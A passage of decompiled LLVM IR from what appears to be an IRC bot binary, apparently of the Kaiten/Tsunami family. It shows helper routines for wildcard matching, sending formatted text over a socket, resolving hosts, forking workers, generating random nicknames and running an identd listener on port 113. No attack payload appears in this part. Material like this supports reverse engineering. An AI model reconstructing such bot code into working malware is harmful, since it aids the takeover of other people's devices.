  %v2_838c = icmp eq i8 %v2_8388, 0
  br i1 %v2_838c, label %dec_label_pc_83c8, label %dec_label_pc_8394

dec_label_pc_8394:                                ; preds = %dec_label_pc_8384
  %v1_8398 = add i32 %arg2, 1
  %v4_83a4 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8398)
  %v2_83ac = icmp eq i32 %v4_83a4, 0
  br i1 %v2_83ac, label %dec_label_pc_83c0, label %dec_label_pc_83c8

dec_label_pc_83c0:                                ; preds = %dec_label_pc_8394, %dec_label_pc_8364
  br label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %dec_label_pc_8384, %dec_label_pc_8394, %dec_label_pc_83c0
  %storemerge7 = phi i32 [ 0, %dec_label_pc_83c0 ], [ 1, %dec_label_pc_8394 ], [ 1, %dec_label_pc_8384 ]
  br label %dec_label_pc_85f0

dec_label_pc_83d4:                                ; preds = %dec_label_pc_8208
  %v1_83d8 = add i32 %tmp19, 1
  %v3_83e4 = inttoptr i32 %v1_83d8 to i8*
  %v4_83e4 = call i32 @strwildmatch(i8* %v3_83e4, i32 %arg2)
  %v2_83ec = icmp eq i32 %v4_83e4, 0
  br i1 %v2_83ec, label %dec_label_pc_8430, label %dec_label_pc_83f4

dec_label_pc_83f4:                                ; preds = %dec_label_pc_83d4
  %v2_83f8 = load i8, i8* %tmp, align 1
  %v2_83fc = icmp eq i8 %v2_83f8, 0
  br i1 %v2_83fc, label %dec_label_pc_8438, label %dec_label_pc_8404

dec_label_pc_8404:                                ; preds = %dec_label_pc_83f4
  %v1_8408 = add i32 %arg2, 1
  %v4_8414 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8408)
  %v2_841c = icmp eq i32 %v4_8414, 0
  br i1 %v2_841c, label %dec_label_pc_8430, label %dec_label_pc_8438

dec_label_pc_8430:                                ; preds = %dec_label_pc_8404, %dec_label_pc_83d4
  br label %dec_label_pc_8438

dec_label_pc_8438:                                ; preds = %dec_label_pc_83f4, %dec_label_pc_8404, %dec_label_pc_8430
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8430 ], [ 1, %dec_label_pc_8404 ], [ 1, %dec_label_pc_83f4 ]
  br label %dec_label_pc_85f0

dec_label_pc_8444:                                ; preds = %dec_label_pc_823c
  %v1_8448 = add i32 %tmp19, 1
  %v3_8454 = inttoptr i32 %v1_8448 to i8*
  %v4_8454 = call i32 @strwildmatch(i8* %v3_8454, i32 %arg2)
  %v2_845c = icmp eq i32 %v4_8454, 0
  br i1 %v2_845c, label %dec_label_pc_84a0, label %dec_label_pc_8464

dec_label_pc_8464:                                ; preds = %dec_label_pc_8444
  %v2_8468 = load i8, i8* %tmp, align 1
  %v2_846c = icmp eq i8 %v2_8468, 0
  br i1 %v2_846c, label %dec_label_pc_84a8, label %dec_label_pc_8474

dec_label_pc_8474:                                ; preds = %dec_label_pc_8464
  %v1_8478 = add i32 %arg2, 1
  %v4_8484 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8478)
  %v2_848c = icmp eq i32 %v4_8484, 0
  br i1 %v2_848c, label %dec_label_pc_84a0, label %dec_label_pc_84a8

dec_label_pc_84a0:                                ; preds = %dec_label_pc_8474, %dec_label_pc_8444
  br label %dec_label_pc_84a8

dec_label_pc_84a8:                                ; preds = %dec_label_pc_8464, %dec_label_pc_8474, %dec_label_pc_84a0
  %storemerge4 = phi i32 [ 0, %dec_label_pc_84a0 ], [ 1, %dec_label_pc_8474 ], [ 1, %dec_label_pc_8464 ]
  br label %dec_label_pc_85f0

dec_label_pc_84b4:                                ; preds = %entry
  %v1_84b8 = add i32 %tmp19, 1
  %v3_84c4 = inttoptr i32 %v1_84b8 to i8*
  %v4_84c4 = call i32 @strwildmatch(i8* %v3_84c4, i32 %arg2)
  %v2_84cc = icmp eq i32 %v4_84c4, 0
  br i1 %v2_84cc, label %dec_label_pc_8510, label %dec_label_pc_84d4

dec_label_pc_84d4:                                ; preds = %dec_label_pc_84b4
  %v2_84d8 = load i8, i8* %tmp, align 1
  %v2_84dc = icmp eq i8 %v2_84d8, 0
  br i1 %v2_84dc, label %dec_label_pc_8518, label %dec_label_pc_84e4

dec_label_pc_84e4:                                ; preds = %dec_label_pc_84d4
  %v1_84e8 = add i32 %arg2, 1
  %v4_84f4 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_84e8)
  %v2_84fc = icmp eq i32 %v4_84f4, 0
  br i1 %v2_84fc, label %dec_label_pc_8510, label %dec_label_pc_8518

dec_label_pc_8510:                                ; preds = %dec_label_pc_84e4, %dec_label_pc_84b4
  br label %dec_label_pc_8518

dec_label_pc_8518:                                ; preds = %dec_label_pc_84d4, %dec_label_pc_84e4, %dec_label_pc_8510
  %storemerge9 = phi i32 [ 0, %dec_label_pc_8510 ], [ 1, %dec_label_pc_84e4 ], [ 1, %dec_label_pc_84d4 ]
  br label %dec_label_pc_85f0

dec_label_pc_8524:                                ; preds = %dec_label_pc_822c
  %v2_8528 = load i8, i8* %tmp, align 1
  %v2_852c = icmp eq i8 %v2_8528, 0
  br i1 %v2_852c, label %dec_label_pc_8570, label %dec_label_pc_8534

dec_label_pc_8534:                                ; preds = %dec_label_pc_8524
  %v1_8538 = add i32 %tmp19, 1
  %v1_8540 = add i32 %arg2, 1
  %v2_854c = inttoptr i32 %v1_8538 to i8*
  %v3_854c = call i32 @strwildmatch(i8* %v2_854c, i32 %v1_8540)
  %v2_8554 = icmp ne i32 %v3_854c, 0
  %. = zext i1 %v2_8554 to i32
  br label %dec_label_pc_8570

dec_label_pc_8570:                                ; preds = %dec_label_pc_8534, %dec_label_pc_8524
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8524 ], [ %., %dec_label_pc_8534 ]
  br label %dec_label_pc_85f0

dec_label_pc_857c:                                ; preds = %dec_label_pc_8264, %dec_label_pc_823c, %dec_label_pc_822c
  %v2_8580 = load i8, i8* %arg1, align 1
  %v3_8580 = zext i8 %v2_8580 to i32
  %v1_8588 = call i32 @__GI_toupper(i32 %v3_8580)
  store i32 %v1_8588, i32* @r4, align 4
  %v2_8594 = load i8, i8* %tmp, align 1
  %v3_8594 = zext i8 %v2_8594 to i32
  %v1_859c = call i32 @__GI_toupper(i32 %v3_8594)
  %v0_85a4 = load i32, i32* @r4, align 4
  %v9_85a4 = icmp eq i32 %v0_85a4, %v1_859c
  br i1 %v9_85a4, label %dec_label_pc_85ac, label %dec_label_pc_85e8

dec_label_pc_85ac:                                ; preds = %dec_label_pc_857c
  %v1_85b0 = add i32 %tmp19, 1
  %v1_85b8 = add i32 %arg2, 1
  %v2_85c4 = inttoptr i32 %v1_85b0 to i8*
  %v3_85c4 = call i32 @strwildmatch(i8* %v2_85c4, i32 %v1_85b8)
  %v2_85cc = icmp ne i32 %v3_85c4, 0
  %.18 = zext i1 %v2_85cc to i32
  br label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85ac, %dec_label_pc_857c
  %storemerge = phi i32 [ 1, %dec_label_pc_857c ], [ %.18, %dec_label_pc_85ac ]
  br label %dec_label_pc_85f0

dec_label_pc_85f0:                                ; preds = %dec_label_pc_8570, %dec_label_pc_8518, %dec_label_pc_84a8, %dec_label_pc_8438, %dec_label_pc_83c8, %dec_label_pc_8358, %dec_label_pc_82e8, %dec_label_pc_8274, %dec_label_pc_85e8
  %stack_var_-64.0 = phi i32 [ %storemerge9, %dec_label_pc_8518 ], [ %storemerge8, %dec_label_pc_8358 ], [ %storemerge7, %dec_label_pc_83c8 ], [ %storemerge6, %dec_label_pc_82e8 ], [ %storemerge, %dec_label_pc_85e8 ], [ %storemerge5, %dec_label_pc_8438 ], [ %storemerge4, %dec_label_pc_84a8 ], [ %v3_8278, %dec_label_pc_8274 ], [ %storemerge3, %dec_label_pc_8570 ]
  store i32 %v3_81d0, i32* @r4, align 4
  store i32 %v6_81d0, i32* @fp, align 4
  ret i32 %stack_var_-64.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp19, { 3, 0, 7, 1, 2, 5, 6, 4 }
  uselistorder i8* %tmp, { 4, 0, 8, 2, 3, 6, 7, 5, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 13, 12, 0, 1, 10, 11, 8, 9, 4, 5, 2, 3, 6, 7, 14 }
  uselistorder i8* %arg1, { 2, 6, 0, 1, 4, 5, 3, 7, 8 }
  uselistorder label %dec_label_pc_85f0, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_8518, { 2, 1, 0 }
  uselistorder label %dec_label_pc_84a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8438, { 2, 1, 0 }
  uselistorder label %dec_label_pc_83c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8358, { 2, 1, 0 }
  uselistorder label %dec_label_pc_82e8, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8608 = load i32, i32* @fp, align 4
  store i32 34320, i32* %stack_var_-16, align 4
  %v2_860c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_860c, i32* @fp, align 4
  %v4_861c = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i8** @global_var_2b90c.39 to i32), i32* @r0, align 4
  %v4_8630 = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_2b90c.39 to i32), i32 %arg2, i32 %v4_861c)
  %v3_8638 = call i32 @strlen(i8* bitcast (i8** @global_var_2b90c.39 to i8*))
  store i32 %arg1, i32* @r0, align 4
  store i32 ptrtoint (i8** @global_var_2b90c.39 to i32), i32* @r1, align 4
  store i32 %v3_8638, i32* @r2, align 4
  %v0_864c = call i32 @write()
  store i32 %v3_8608, i32* @fp, align 4
  ret i32 %v0_864c

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_2b90c.39 to i32), { 2, 0, 1 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8668 = load i32, i32* @fp, align 4
  store i32 34416, i32* %stack_var_-4, align 4
  %v2_866c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_866c, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_8680 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_8680, i32* @global_var_2bd0c.41, align 4
  %v3_8698 = icmp eq i32 %v1_8680, -1
  br i1 %v3_8698, label %dec_label_pc_86a0, label %dec_label_pc_8704

dec_label_pc_86a0:                                ; preds = %entry
  %v3_86a0 = load i32, i32* %stack_var_-28, align 4
  %v1_86a4 = call i32 @__GI_gethostbyname(i32 %v3_86a0)
  %v2_86b4 = icmp eq i32 %v1_86a4, 0
  br i1 %v2_86b4, label %dec_label_pc_86bc, label %dec_label_pc_86e0

dec_label_pc_86bc:                                ; preds = %dec_label_pc_86a0
  %v2_86c0 = load i32, i32* @global_var_3021c.43, align 4
  %v4_86d4 = call i32 @Send(i32 %v2_86c0, i32 ptrtoint ([33 x i8]* @global_var_1cfe4.45 to i32), i32 %arg1)
  %v1_86dc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_86e0

dec_label_pc_86e0:                                ; preds = %dec_label_pc_86a0, %dec_label_pc_86bc
  %v1_86e4 = add i32 %v1_86a4, 16
  %v2_86e4 = inttoptr i32 %v1_86e4 to i32*
  %v3_86e4 = load i32, i32* %v2_86e4, align 4
  %v1_86e8 = inttoptr i32 %v3_86e4 to i32*
  %v2_86e8 = load i32, i32* %v1_86e8, align 4
  %v1_86f4 = add i32 %v1_86a4, 12
  %v2_86f4 = inttoptr i32 %v1_86f4 to i32*
  %v3_86f4 = load i32, i32* %v2_86f4, align 4
  store i32 %v3_86f4, i32* @r2, align 4
  %v3_8700 = call i32 @bcopy(i32 %v2_86e8, i32 ptrtoint (i32* @global_var_2bd0c.41 to i32), i32 %v3_86f4)
  %v2_8708.pre = load i32, i32* @global_var_2bd0c.41, align 4
  br label %dec_label_pc_8704

dec_label_pc_8704:                                ; preds = %entry, %dec_label_pc_86e0
  %v2_8708 = phi i32 [ %v1_8680, %entry ], [ %v2_8708.pre, %dec_label_pc_86e0 ]
  store i32 %v3_8668, i32* @fp, align 4
  ret i32 %v2_8708

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_2bd0c.41, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8704, { 1, 0 }
  uselistorder label %dec_label_pc_86e0, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_8728 = load i32, i32* @fp, align 4
  store i32 34608, i32* %stack_var_-4, align 4
  %v2_872c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_872c, i32* @fp, align 4
  %v2_873c = load i8, i8* bitcast (i8** @global_var_2b8fc.47 to i8*), align 4
  %v7_8740 = icmp eq i8 %v2_873c, 1
  br i1 %v7_8740, label %dec_label_pc_8748, label %dec_label_pc_876c

dec_label_pc_8748:                                ; preds = %entry
  %v2_874c = load i32, i32* @global_var_3021c.43, align 4
  %v4_875c = call i32 @Send(i32 %v2_874c, i32 ptrtoint ([30 x i8]* @global_var_1d008.50 to i32), i32 %arg1)
  br label %dec_label_pc_8870

dec_label_pc_876c:                                ; preds = %entry
  %v0_876c = call i32 @fork()
  %v2_877c = icmp eq i32 %v0_876c, 0
  br i1 %v2_877c, label %dec_label_pc_8784, label %dec_label_pc_8790

dec_label_pc_8784:                                ; preds = %dec_label_pc_876c
  br label %dec_label_pc_8870

dec_label_pc_8790:                                ; preds = %dec_label_pc_876c
  %v2_8794 = load i32, i32* @global_var_2b908.52, align 4
  %v1_8798 = add i32 %v2_8794, 1
  store i32 %v1_8798, i32* @global_var_2b908.52, align 4
  %v3_87ac = mul i32 %v1_8798, 4
  %v1_87b0 = add i32 %v3_87ac, 4
  %v1_87b8 = call i32 @malloc(i32 %v1_87b0)
  %v2_881412 = load i32, i32* @global_var_2b908.52, align 4
  %v9_882014 = icmp eq i32 %v2_881412, 1
  br i1 %v9_882014, label %dec_label_pc_8828, label %dec_label_pc_87d0

dec_label_pc_87d0:                                ; preds = %dec_label_pc_8790, %dec_label_pc_87d0
  %storemerge116 = phi i32 [ %v1_8808, %dec_label_pc_87d0 ], [ 0, %dec_label_pc_8790 ]
  %v3_87d4 = mul i32 %storemerge116, 4
  %v2_87e0 = add i32 %v3_87d4, %v1_87b8
  %v2_87f4 = load i32, i32* @global_var_30234.54, align 4
  %v2_87f8 = add i32 %v2_87f4, %v3_87d4
  %v1_87fc = inttoptr i32 %v2_87f8 to i32*
  %v2_87fc = load i32, i32* %v1_87fc, align 4
  %v2_8800 = inttoptr i32 %v2_87e0 to i32*
  store i32 %v2_87fc, i32* %v2_8800, align 4
  %v1_8808 = add i32 %storemerge116, 1
  %v2_8814 = load i32, i32* @global_var_2b908.52, align 4
  %v1_8818 = add i32 %v2_8814, -1
  %tmp = icmp ugt i32 %v1_8818, %v1_8808
  br i1 %tmp, label %dec_label_pc_87d0, label %dec_label_pc_8810.dec_label_pc_8828_crit_edge

dec_label_pc_8810.dec_label_pc_8828_crit_edge:    ; preds = %dec_label_pc_87d0
  br label %dec_label_pc_8828

dec_label_pc_8828:                                ; preds = %dec_label_pc_8790, %dec_label_pc_8810.dec_label_pc_8828_crit_edge
  %v2_8814.lcssa = phi i32 [ %v2_8814, %dec_label_pc_8810.dec_label_pc_8828_crit_edge ], [ %v2_881412, %dec_label_pc_8790 ]
  %v3_8830 = mul i32 %v2_8814.lcssa, 4
  %v2_883c = add i32 %v1_87b8, -4
  %v1_8840 = add i32 %v2_883c, %v3_8830
  %v2_8848 = inttoptr i32 %v1_8840 to i32*
  store i32 %v0_876c, i32* %v2_8848, align 4
  %v2_8850 = load i32, i32* @global_var_30234.54, align 4
  store i32 %v2_8850, i32* @r0, align 4
  %v0_8858 = call i32 @free()
  store i32 %v1_87b8, i32* @global_var_30234.54, align 4
  br label %dec_label_pc_8870

dec_label_pc_8870:                                ; preds = %dec_label_pc_8784, %dec_label_pc_8748, %dec_label_pc_8828
  %v3_8870 = phi i32 [ 0, %dec_label_pc_8784 ], [ 1, %dec_label_pc_8748 ], [ %v0_876c, %dec_label_pc_8828 ]
  store i32 %v3_8728, i32* @fp, align 4
  ret i32 %v3_8870

; uselistorder directives
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_881412, { 1, 0 }
  uselistorder i32 %v1_87b8, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8870, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8828, { 1, 0 }
  uselistorder label %dec_label_pc_87d0, { 1, 0 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8894 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8894, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-20, align 4
  br label %dec_label_pc_88d0

dec_label_pc_88ac:                                ; preds = %dec_label_pc_88f8, %dec_label_pc_88d0
  %v3_88ac = phi i8* [ %v3_8908, %dec_label_pc_88f8 ], [ %v3_88e0, %dec_label_pc_88d0 ]
  %v3_88b0 = call i32 @strlen(i8* %v3_88ac)
  %v3_88bc = load i8*, i8** %stack_var_-20, align 4
  %v4_88bc = ptrtoint i8* %v3_88bc to i32
  %v2_88c0 = add i32 %v3_88b0, -1
  %v1_88c4 = add i32 %v2_88c0, %v4_88bc
  %v3_88cc = inttoptr i32 %v1_88c4 to i8*
  store i8 0, i8* %v3_88cc, align 1
  %v3_88d0.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %entry, %dec_label_pc_88ac
  %v3_88d0 = phi i8* [ %arg1, %entry ], [ %v3_88d0.pre, %dec_label_pc_88ac ]
  %v3_88d4 = call i32 @strlen(i8* %v3_88d0)
  %v3_88e0 = load i8*, i8** %stack_var_-20, align 4
  %v4_88e0 = ptrtoint i8* %v3_88e0 to i32
  %v2_88e4 = add i32 %v3_88d4, -1
  %v1_88e8 = add i32 %v2_88e4, %v4_88e0
  %v1_88ec = inttoptr i32 %v1_88e8 to i8*
  %v2_88ec = load i8, i8* %v1_88ec, align 1
  %v7_88f0 = icmp eq i8 %v2_88ec, 13
  br i1 %v7_88f0, label %dec_label_pc_88ac, label %dec_label_pc_88f8

dec_label_pc_88f8:                                ; preds = %dec_label_pc_88d0
  %v3_88fc = call i32 @strlen(i8* %v3_88e0)
  %v3_8908 = load i8*, i8** %stack_var_-20, align 4
  %v4_8908 = ptrtoint i8* %v3_8908 to i32
  %v2_890c = add i32 %v3_88fc, -1
  %v1_8910 = add i32 %v2_890c, %v4_8908
  %v1_8914 = inttoptr i32 %v1_8910 to i8*
  %v2_8914 = load i8, i8* %v1_8914, align 1
  %v7_8918 = icmp eq i8 %v2_8914, 10
  br i1 %v7_8918, label %dec_label_pc_88ac, label %dec_label_pc_8920

dec_label_pc_8920:                                ; preds = %dec_label_pc_88f8
  ret i32 %v3_88fc

; uselistorder directives
  uselistorder i8* %v3_8908, { 1, 0 }
  uselistorder i8* %v3_88e0, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
}

define i32 @makestring(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1068 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8928 = load i32, i32* @r4, align 4
  %v6_8928 = load i32, i32* @fp, align 4
  store i32 35120, i32* %stack_var_-4, align 4
  %v2_892c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_892c, i32* @fp, align 4
  %v2_8934 = ptrtoint i32* %stack_var_-1068 to i32
  %v0_8938 = call i32 @random()
  %v2_8948 = srem i32 %v0_8938, 5
  %v1_8950 = add nsw i32 %v2_8948, 4
  %v1_895c = add nsw i32 %v2_8948, 5
  %v1_8964 = call i32 @malloc(i32 %v1_895c)
  store i32 %v1_895c, i32* @r2, align 4
  store i32 %v1_8964, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_8988 = call i32 @__GI_memset()
  store i32 ptrtoint ([16 x i8]* @global_var_1d028.56 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1d038.58 to i32), i32* @r1, align 4
  %v3_8994 = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_1d028.56 to i32), i32 ptrtoint (i32* @global_var_1d038.58 to i32))
  %v2_89a4 = icmp eq i32 %v3_8994, 0
  br i1 %v2_89a4, label %dec_label_pc_89fc.preheader, label %dec_label_pc_8a10

dec_label_pc_89fc.preheader:                      ; preds = %entry
  %v5_8a0822 = icmp sgt i32 %v2_8948, -4
  br i1 %v5_8a0822, label %dec_label_pc_89b8, label %dec_label_pc_8aec

dec_label_pc_89b8:                                ; preds = %dec_label_pc_89fc.preheader, %dec_label_pc_89b8
  %storemerge323 = phi i32 [ %v1_89f4, %dec_label_pc_89b8 ], [ 0, %dec_label_pc_89fc.preheader ]
  %v2_89c4 = add i32 %storemerge323, %v1_8964
  store i32 %v2_89c4, i32* @r4, align 4
  %v0_89c8 = call i32 @random()
  %v2_89d8 = srem i32 %v0_89c8, 26
  %fold = add nsw i32 %v2_89d8, 65
  %v1_89ec = trunc i32 %fold to i8
  %v2_89ec = load i32, i32* @r4, align 4
  %v3_89ec = inttoptr i32 %v2_89ec to i8*
  store i8 %v1_89ec, i8* %v3_89ec, align 1
  %v1_89f4 = add nuw nsw i32 %storemerge323, 1
  %v5_8a08 = icmp slt i32 %v1_89f4, %v1_8950
  br i1 %v5_8a08, label %dec_label_pc_89b8, label %dec_label_pc_8aec

dec_label_pc_8a10:                                ; preds = %entry
  %v0_8a10 = call i32 @random()
  store i32 %v0_8a10, i32* @r4, align 4
  %v0_8a18 = call i32 @random()
  %v0_8a20 = load i32, i32* @r4, align 4
  %v2_8a20 = mul i32 %v0_8a20, %v0_8a18
  %v2_8a30 = srem i32 %v2_8a20, 45402
  %v5_8a7c30 = icmp slt i32 %v2_8a30, 0
  br i1 %v5_8a7c30, label %dec_label_pc_8a80, label %dec_label_pc_8a4c

dec_label_pc_8a4c:                                ; preds = %dec_label_pc_8a10, %dec_label_pc_8a4c
  %storemerge231 = phi i32 [ %v1_8a68, %dec_label_pc_8a4c ], [ 0, %dec_label_pc_8a10 ]
  %v3_8a60 = call i32 @fgets(i32 %v2_8934, i32 1024, i32 %v3_8994)
  %v1_8a68 = add nuw nsw i32 %storemerge231, 1
  %v5_8a7c = icmp slt i32 %storemerge231, %v2_8a30
  br i1 %v5_8a7c, label %dec_label_pc_8a4c, label %dec_label_pc_8a80

dec_label_pc_8a80:                                ; preds = %dec_label_pc_8a4c, %dec_label_pc_8a10
  store i32 1024, i32* @r2, align 4
  store i32 %v2_8934, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_8a94 = call i32 @__GI_memset()
  %v3_8aac = call i32 @fgets(i32 %v2_8934, i32 1024, i32 %v3_8994)
  %v1_8abc = bitcast i32* %stack_var_-1068 to i8*
  %v2_8abc = call i32 @filter(i8* %v1_8abc)
  store i32 %v1_8964, i32* @r0, align 4
  store i32 %v2_8934, i32* @r1, align 4
  store i32 %v1_8950, i32* @r2, align 4
  %v0_8ae0 = call i32 @memcpy()
  %v1_8ae8 = inttoptr i32 %v3_8994 to i8*
  %v2_8ae8 = call i32 @__GI_fclose(i8* %v1_8ae8)
  br label %dec_label_pc_8aec

dec_label_pc_8aec:                                ; preds = %dec_label_pc_89fc.preheader, %dec_label_pc_89b8, %dec_label_pc_8a80
  store i32 %v3_8928, i32* @r4, align 4
  store i32 %v6_8928, i32* @fp, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_89f4, { 1, 0 }
  uselistorder i32 %v1_8964, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8aec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8a4c, { 1, 0 }
  uselistorder label %dec_label_pc_89b8, { 1, 0 }
}

define i32 @identd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_8b08 = load i32, i32* @fp, align 4
  store i32 %v3_8b08, i32* %stack_var_-16, align 4
  %v13_8b08 = ptrtoint i32* %stack_var_-16 to i32
  %v0_8b24 = call i32 @socket()
  %v7_8b34 = icmp eq i32 %v0_8b24, -1
  br i1 %v7_8b34, label %dec_label_pc_8ed4, label %dec_label_pc_8b3c

dec_label_pc_8b3c:                                ; preds = %entry
  %v1_8b50 = call i32 @htons(i32 113)
  %v0_8b94 = call i32 @bind()
  %v7_8b9c = icmp eq i32 %v0_8b94, -1
  br i1 %v7_8b9c, label %dec_label_pc_8ed4, label %dec_label_pc_8ba4

dec_label_pc_8ba4:                                ; preds = %dec_label_pc_8b3c
  %v0_8bac = call i32 @listen()
  %v7_8bb4 = icmp eq i32 %v0_8bac, -1
  br i1 %v7_8bb4, label %dec_label_pc_8ed4, label %dec_label_pc_8bbc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8ba4
  %v0_8bbc = call i32 @fork()
  %v2_8bc4 = icmp eq i32 %v0_8bbc, 0
  br i1 %v2_8bc4, label %dec_label_pc_8ed4, label %dec_label_pc_8bcc

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8bbc
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8bd4 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8bd8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8bd8, i32* @r2, align 4
  store i32 %v0_8b24, i32* @r0, align 4
  store i32 %v2_8bd4, i32* @r1, align 4
  %v0_8be4 = call i32 @accept()
  %v2_8bf4 = add i32 %v0_8be4, 1
  %v3_8bf4 = icmp eq i32 %v0_8be4, -1
  br i1 %v3_8bf4, label %dec_label_pc_8bfc, label %dec_label_pc_8c04.preheader

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8bcc
  %v1_8c00 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8c04.preheader

dec_label_pc_8c04.preheader:                      ; preds = %dec_label_pc_8bfc, %dec_label_pc_8bcc
  %v2_8c0c = ptrtoint i32* %stack_var_-1236 to i32
  %v3_8c4c = udiv i32 %v0_8be4, 32
  %v3_8c60 = mul nuw nsw i32 %v3_8c4c, 4
  %v2_8c68 = add i32 %v3_8c60, %v13_8b08
  %v1_8c78 = urem i32 %v0_8be4, 32
  %v6_8c80 = shl i32 1, %v1_8c78
  %v2_8cd0 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8d1c = add i32 %v2_8c68, -1220
  %v1_8d20 = inttoptr i32 %v2_8d1c to i32*
  br label %dec_label_pc_8c20.lr.ph

dec_label_pc_8c20.lr.ph:                          ; preds = %dec_label_pc_8d00, %dec_label_pc_8c04.preheader
  br label %dec_label_pc_8c20

dec_label_pc_8c20:                                ; preds = %dec_label_pc_8c20.lr.ph, %dec_label_pc_8c20
  %storemerge26 = phi i32 [ 0, %dec_label_pc_8c20.lr.ph ], [ %v1_8c34, %dec_label_pc_8c20 ]
  %v5_8c2c = mul nuw nsw i32 %storemerge26, 4
  %v6_8c2c = add i32 %v5_8c2c, %v2_8c0c
  %v7_8c2c = inttoptr i32 %v6_8c2c to i32*
  store i32 0, i32* %v7_8c2c, align 4
  %v1_8c34 = add nuw nsw i32 %storemerge26, 1
  %tmp37 = icmp ult i32 %v1_8c34, 32
  br i1 %tmp37, label %dec_label_pc_8c20, label %dec_label_pc_8c48

dec_label_pc_8c48:                                ; preds = %dec_label_pc_8c20
  %v2_8c70 = load i32, i32* %v1_8d20, align 4
  %v2_8c84 = or i32 %v2_8c70, %v6_8c80
  store i32 %v2_8c84, i32* %v1_8d20, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8ce8 = call i32 @__libc_select(i32 %v2_8bf4, i32 %v2_8c0c, i32 0, i32 0, i32 %v2_8cd0)
  %v1_8cf0 = icmp slt i32 %v5_8ce8, 0
  br i1 %v1_8cf0, label %dec_label_pc_8cf8, label %dec_label_pc_8d00

dec_label_pc_8cf8:                                ; preds = %dec_label_pc_8c48
  %v1_8cfc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8c48, %dec_label_pc_8cf8
  %v2_8d20 = load i32, i32* %v1_8d20, align 4
  %v6_8d2c1 = lshr i32 %v2_8d20, %v1_8c78
  %v1_8d34 = urem i32 %v6_8d2c1, 2
  %v2_8d38 = icmp eq i32 %v1_8d34, 0
